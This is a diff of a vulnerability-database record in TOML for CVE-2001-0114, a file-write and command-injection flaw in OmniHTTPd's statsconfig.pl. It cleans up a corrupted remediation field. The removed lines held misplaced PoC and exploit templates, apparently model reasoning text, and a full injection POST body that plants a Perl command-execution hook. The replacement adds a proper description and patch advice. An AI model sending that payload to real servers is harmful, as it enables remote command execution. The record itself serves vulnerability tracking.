@@ -1,77 +1,12 @@
 [basic]
-description = "OmniHTTPd 2.07 的 statsconfig.pl CGI 脚本存在任意文件写入漏洞。远程攻击者可通过 cgidir 参数控制文件写入路径，向服务器任意位置写入恶意文件，进而可能导致远程代码执行。攻击无需认证，通过网络即可发起，危害较大。"
-published = "2001-03-12T05:00:00Z"
-remediation = '''
-[info]
-id = "POC-AVE-2001-00001"
-name = "CVE-2001-0114 PoC"
-author = "AVE"
-severity = "high"
-tags = ["cve-2001-0114"]
-description = "检测 OmniHTTPd 2.07 statsconfig.pl 是否存在"
-vuln_id = ["CVE-2001-0114", "AVE-2001-00001"]
-
-[poc]
-logic = "any"
-
-[[poc.requests]]
-protocol = "http"
-method = "GET"
-path = "/{{BaseURL}}/cgi-bin/statsconfig.pl"
-headers = { "User-Agent" = "AVE/1.0" }
-
-[[poc.requests.matchers]]
-type = "status"
-status = [200, 500]
-expect = true
-```
-
-For the EXP, I'll use TCP protocol since the exploit sends raw HTTP POST requests:
-
-```toml
-[info]
-id = "EXP-AVE-2001-00001"
-name = "CVE-2001-0114 EXP"
-author = "AVE"
-severity = "high"
-tags = ["cve-2001-0114"]
-description = "OmniHTTPd 2.07 statsconfig.pl 命令注入利用 - 注入 Perl open() 调用实现远程命令执行"
-vuln_id = ["CVE-2001-0114", "AVE-2001-00001"]
-
-[poc]
-logic = "any"
-
-[[poc.requests]]
-protocol = "tcp"
-path = "{{Hostname}}:{{Port}}"
-
-[poc.requests.raw]
-type = "tcp"
-content = "POST /cgi-bin/statsconfig.pl HTTP/1.0\r\nContent-type: application/x-www-form-urlencoded\r\nContent-length: 0\r\n\r\n"
-
-[[poc.requests.matchers]]
-type = "word"
-words = ["statsconfig"]
-expect = true
-```
-
-Hmm, actually for the EXP I should use the actual exploit payload. Let me think about this more carefully.
-
-The exploit from EDB-20557 sends a POST request with specific parameters. For the EXP, I should replicate the actual exploit behavior. Let me create a proper TCP-based EXP that sends the injection payload.
-
-Actually, looking at the exploit code more carefully, the injection mode sends:
-```
-POST /cgi-bin/statsconfig.pl HTTP/1.0
-Content-type: application/x-www-form-urlencoded
-Content-length: <length>
-
-perllib=<cgipath>/statsconfig.pl%00&cgidir=<cgipath>&deflimit=&mostip=on&mostreq=on&mostbrowsers=on&timelog=on&mostipnum=5&mostreqf=5&mostbrowsernum=5;%20if($ENV{'QUERY_STRING'}){open(QS,$ENV{'QUERY_STRING'});}$a%3D1&logloc=c%3A%2Fhttpd%2Flogs%2Faccess.log&imagebar=%2Fstatsbar.gif&serveradd=%3C%21--%23echo+var%3D&barwidth=100&barheight=5&listpass=&bgcolor=%23FFFFFF&bgimage=&ttBGcolor=%23FFFFDD
-'''
+description = "OmniHTTPd 2.07 默认安装的 statsconfig.pl CGI 脚本未对用户输入进行充分过滤，存在任意文件覆盖与命令注入漏洞。未经身份认证的远程攻击者可通过向目标服务器发送特制 POST 请求，利用 cgidir 参数覆盖服务器上的任意文件（包括位于其他驱动器的文件），或通过 mostbrowsers 参数向生成的 Perl 脚本中注入任意代码。当 statsconfig 执行该脚本时，注入的代码将在 Web 服务器权限下运行，导致远程命令执行。该漏洞影响 Windows 平台下的 OmniHTTPd 2.07 及可能更早版本，成功利用可导致完全控制目标主机或拒绝服务。"
+published = "2001-03-12T05:00:00.000"
+remediation = "立即将 OmniHTTPd 升级至 2.08 或更高版本，该版本已修复 statsconfig.pl 中 cgidir 参数导致的任意文件写入漏洞。如厂商未提供补丁，建议暂时禁用或删除 /cgi-bin/statsconfig.pl 脚本，并在防火墙中限制对 /cgi-bin/statsconfig.pl 的外部访问。作为临时缓解措施，可将 cgi-bin 目录设为仅本地访问，或改用其他受支持的 Web 服务器替代 OmniHTTPd 2.07。"
 score = 5
 severity = "MEDIUM"
-sources = ["cve"]
+sources = ["epss"]
 title = "Omnicron OmniHTTPd 任意文件写入漏洞"
-updated = "2026-06-16T21:53:40Z"
+updated = "2026-06-16T21:53:40.907"
 
 [exploit]
 exp_urls = []
@@ -82,7 +17,7 @@ aliases = ["CVE-2001-0114"]
 ave_id = "AVE-2001-0048"
 
 [meta]
-collected_at = "2026-08-05T00:00:00Z"
+collected_at = "2026-08-06T00:00:00Z"
 status = "completed"
 
 [references]
@@ -90,14 +25,14 @@ urls = [
     "http://archives.neohapsis.com/archives/bugtraq/2001-01/0248.html",
     "http://www.securityfocus.com/bid/2211",
     "https://www.exploit-db.com/exploits/20557",
-    "https://github.com/CVEProject/cvelistV5/blob/94290d9b87aa464f4465c4bb2b955170c77f08c2/cves/2001/0xxx/CVE-2001-0114.json",
-    "https://github.com/Patrowl/PatrowlHearsData/blob/5d8a0e95a20fbbbf3a45b439096d57770d841dec/CVE/data/2001/CVE-2001-0114.json",
+    "https://github.com/CVEProject/cvelistV5/blob/316b61870d1ace84a248a4e6c4f8802fe9d4e563/cves/2001/0xxx/CVE-2001-0114.json",
+    "https://github.com/Patrowl/PatrowlHearsData/blob/6a1b50264c71aac35268f73e4f9a8ca10ac6b2eb/CVE/data/2001/CVE-2001-0114.json",
     "https://github.com/LiuCan01/cve-list-pro/blob/78b55511cee3604c22d518e32822f0435d0cacc0/cve-list/CVE-2001/CVE-2001-0114",
     "https://github.com/nomi-sec/NVD-Database/blob/23dc120c34402aaa65883c51c1d03b3cb02c20cb/2001/CVE-2001-0114.json",
-    "https://github.com/olbat/nvdcve/blob/2aff155da1d1b98876d6e9c312b912d434f32dca/nvdcve/CVE-2001-0114.json",
+    "https://github.com/olbat/nvdcve/blob/336c506d8c2ab5b6ec8e55edc2021c49b3be8e2c/nvdcve/CVE-2001-0114.json",
     "https://github.com/fkie-cad/nvd-json-data-feeds/blob/2045bff4b424e5738e99702781803fdc8b55ff87/CVE-2001/CVE-2001-01xx/CVE-2001-0114.json",
-    "https://github.com/opencve/opencve-kb/blob/fc250cf8fdc59c77fa474d34589422db608209f4/2001/CVE-2001-0114.json",
-    "https://github.com/HORKimhab/poc-cve-collection/blob/e2cba2a029d0a53c95f0000f5eb42e0eb69717b8/2001/0xxx/CVE-2001-0114.md",
+    "https://github.com/opencve/opencve-kb/blob/d242f3f5864c79d3b084743ba37b0a5661261a5d/2001/CVE-2001-0114.json",
+    "https://github.com/HORKimhab/poc-cve-collection/blob/dde218104d183b4531b1e275856d67b12288f14d/2001/0xxx/CVE-2001-0114.md",
     "https://github.com/CVEProject/cvelist-dev/blob/5b8fbb570438e8094550205589cc6f1d122acc94/2001/0xxx/CVE-2001-0114.json",
     "https://github.com/CyberSecAI/cve_info/blob/03b7e36424574a3a9ba5fd13480a326b666a1046/2001/0xxx/CVE-2001-0114.json",
 ]
